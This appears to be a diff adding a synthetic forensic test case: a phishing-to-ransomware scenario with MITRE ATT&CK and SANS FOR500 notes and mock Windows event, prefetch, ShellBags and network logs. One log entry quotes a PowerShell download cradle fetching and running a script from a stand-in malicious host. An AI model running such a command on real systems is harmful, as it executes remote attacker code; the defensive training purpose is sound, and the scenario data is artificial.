@@ -1,0 +1,102 @@
+{
+  "case_name": "Phishing Attack → Ransomware",
+  "description": "钓鱼邮件攻击场景：攻击者通过钓鱼邮件窃取员工凭据，登录内网后使用 PowerShell 下载勒索软件，加密共享驱动器上的财务数据，并尝试横向移动。",
+  "knowledge_base": {
+    "mitre_attck": "MITRE ATT&CK Threat Intelligence Knowledge Base:\n\n1. Phishing (T1566): Malicious actors may send deceptive emails to obtain credentials or deliver malware. Indicator: anomalous logon from unusual IP or off-hours.\n\n2. PowerShell (T1059.001): Adversaries may abuse PowerShell for code execution, download cradles, and lateral movement. Indicator: powershell.exe with network download arguments.\n\n3. Data Encrypted for Impact (T1486): Adversaries may encrypt data on target systems to disrupt availability and demand ransom. Indicator: ransomware.exe execution followed by mass file renaming.\n\n4. Lateral Movement via RDP Brute Force (T1021.001 / T1110): Adversaries may use valid accounts or brute force to log on via Remote Desktop. Indicator: multiple failed logon attempts from internal IP.",
+    "sans_for500": "SANS FOR500 Windows Forensic Analysis Knowledge Base:\n\n1. Evidence of Application Execution (应用程序执行证据):\n- Artifacts: Prefetch, Amcache.hve, Shimcache.\n- Forensic Interpretation: These artifacts prove that a specific executable (e.g., powershell.exe, ransomware.exe) was run on the system. They provide execution timestamps, run counts, and file paths.\n\n2. Evidence of File and Folder Opening (文件与文件夹访问证据):\n- Artifacts: Shortcut (LNK) Files, ShellBags.\n- Forensic Interpretation: LNK files prove that a user opened a specific file (e.g., salary_2026.xlsx) or application. ShellBags prove GUI-based directory navigation indicating interactive human activity.\n\n3. Evidence of Account Usage & Authentication (账户使用与认证证据):\n- Artifacts: Windows Event Logs (Security Log).\n- Forensic Interpretation: Event ID 4624 (Successful Logon) and 4625 (Failed Logon) track account access. Event ID 4688 (Process Creation) tracks command-line executions. Off-hour logons or logons from anomalous IPs are strong indicators of account compromise."
+  },
+  "evidence": {
+    "evtx_logs": [
+      {
+        "Source_Log_ID": "EVTX_001",
+        "timestamp": "2026-06-01 08:30:00",
+        "event_id": 4624,
+        "task_category": "Logon",
+        "description": "Successful logon via Outlook Web Access after phishing credential theft.",
+        "user_account": "zhang.san",
+        "ip_address": "45.33.x.x"
+      },
+      {
+        "Source_Log_ID": "EVTX_002",
+        "timestamp": "2026-06-01 08:45:00",
+        "event_id": 4688,
+        "task_category": "Process Creation",
+        "description": "PowerShell.exe executed with arguments: iex (New-Object Net.WebClient).DownloadString('http://malicious.cc/ps.ps1')",
+        "user_account": "zhang.san",
+        "ip_address": "127.0.0.1"
+      },
+      {
+        "Source_Log_ID": "EVTX_003",
+        "timestamp": "2026-06-01 09:00:00",
+        "event_id": 4688,
+        "task_category": "Process Creation",
+        "description": "Process ransomware.exe executed encrypting files in C:\\SharedDrive\\Finance\\",
+        "user_account": "SYSTEM",
+        "ip_address": "127.0.0.1"
+      },
+      {
+        "Source_Log_ID": "EVTX_004",
+        "timestamp": "2026-06-01 09:30:00",
+        "event_id": 4625,
+        "task_category": "Logon",
+        "description": "Multiple failed admin logon attempts — possible lateral movement via RDP brute force.",
+        "user_account": "Administrator",
+        "ip_address": "10.0.0.50"
+      }
+    ],
+    "prefetch_amcache_logs": [
+      {
+        "Source_Log_ID": "PF_001",
+        "timestamp": "2026-06-01 08:45:00",
+        "program_name": "POWERSHELL.EXE",
+        "execution_counter": 2,
+        "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "sha1_hash": "D4F12B..."
+      },
+      {
+        "Source_Log_ID": "PF_002",
+        "timestamp": "2026-06-01 09:00:00",
+        "program_name": "RANSOMWARE.EXE",
+        "execution_counter": 1,
+        "file_path": "C:\\Users\\zhang.san\\Downloads\\ransomware.exe",
+        "sha1_hash": "E5A23C..."
+      }
+    ],
+    "user_behavior_logs": [
+      {
+        "Source_Log_ID": "GUI_001",
+        "timestamp": "2026-06-01 08:50:00",
+        "artifact_type": "ShellBags",
+        "accessed_path": "C:\\SharedDrive\\Finance\\",
+        "target_file": "",
+        "interaction_type": "Accessed Directory"
+      },
+      {
+        "Source_Log_ID": "GUI_002",
+        "timestamp": "2026-06-01 08:55:00",
+        "artifact_type": "LNK_File",
+        "accessed_path": "C:\\SharedDrive\\Finance\\salary_2026.xlsx",
+        "target_file": "salary_2026.xlsx",
+        "interaction_type": "Opened File"
+      }
+    ],
+    "exfiltration_logs": [
+      {
+        "Source_Log_ID": "EXF_001",
+        "timestamp": "2026-06-01 09:10:00",
+        "source_type": "Network_PCAP",
+        "executed_action": "Outbound TLS connection to known ransomware C2 server 185.220.x.x:443",
+        "data_size_mb": 0.5,
+        "destination_ip": "185.220.x.x"
+      },
+      {
+        "Source_Log_ID": "EXF_002",
+        "timestamp": "2026-06-01 09:15:00",
+        "source_type": "Network_PCAP",
+        "executed_action": "Large outbound encrypted data transfer — encrypted files being uploaded to attacker storage.",
+        "data_size_mb": 350.0,
+        "destination_ip": "185.220.x.x"
+      }
+    ]
+  }
+}
